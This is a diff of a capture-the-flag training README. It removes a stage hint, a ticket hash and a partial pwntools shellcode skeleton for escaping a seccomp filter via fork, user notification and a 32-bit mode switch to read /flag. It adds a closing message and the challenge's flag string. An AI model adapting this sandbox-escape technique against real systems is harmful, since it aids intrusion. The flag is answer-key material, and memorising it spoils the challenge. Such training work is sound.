@@ -1,93 +1,11 @@
-# Stage 4
+# how2pwn
 
-(4/5)
-There is only one challege left. Good luck! 
+Excellent Job! You made it!
 
-# Ticket
-7a01505a0cfefc2f8249cb24e01a2890
+That's the way to pwn: `Read` and `Debug`.
 
+Hope you enjoy these challenges!
 
-## Hints
+# flag
 
-```py
-from pwn import *
-
-p = process("./chal5")
-# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
-# This challeneg only allows __NR_seccomp __NR_fork __NR_ioctl __NR_exit
-# 1. You can find a similar challenge here: https://n132.github.io/2022/07/04/S2.html. 
-# 2. After reading the article, I pretty sure you know the solution.
-# 3. Implement it in shellcode
-# 4. The length issue is a little tricky. But you can read my shellcode and make your shellcode shorter
-# 5. for debugging, you may need this: https://sourceware.org/gdb/onlinedocs/gdb/Forks.html
-
-context.arch = 'amd64'
-shellcode = f'''
-create_a_notifier:
-    ...
-    syscall
-
-do_fork:
-    mov r8,rax
-    mov al,0x39
-    syscall
-    cmp rax,0
-    je child_process
-parent_process:
-    xor rax,rax
-clean_req_and_resp:
-    ...
-    loop:
-        ...
-        jne loop
-recv:
-    ...
-    syscall
-copy_id_of_resp:
-    ...
-set_flags_of_resp:
-    ...
-resp:
-    ...
-    syscall
-    jmp parent_process
-child_process:
-    dec rcx
-    cmp rcx,0
-    jne child_process
-show_flag:
-    mov rax,???
-    push rax
-    retf 
-'''
-
-X32_showflag ='''
-    xor eax,eax
-    mov al, 0x5
-    mov ebx,???
-    xor ecx,ecx
-    xor edx,edx
-    int 0x80
-    mov ebx,eax
-    mov al, 3
-    mov ecx,esp
-    mov cl,0x00
-    mov dl,0xff
-    int 0x80
-    mov al,4
-    mov ebx, 1
-    int 0x80
-'''
-# gdb.attach(p,'''
-# b *0xcafe0d3
-# ''')
-
-shellcode = asm(shellcode)
-context.arch = 'i386'
-context.bits = 32
-
-shellcode = shellcode + asm(X32_showflag)
-
-p.send((shellcode+b"/flag\0").ljust(0x100,b'\0'))
-p.interactive()
-```
+flag{8d13cfa357978684be9809172d3033ce739015f5}
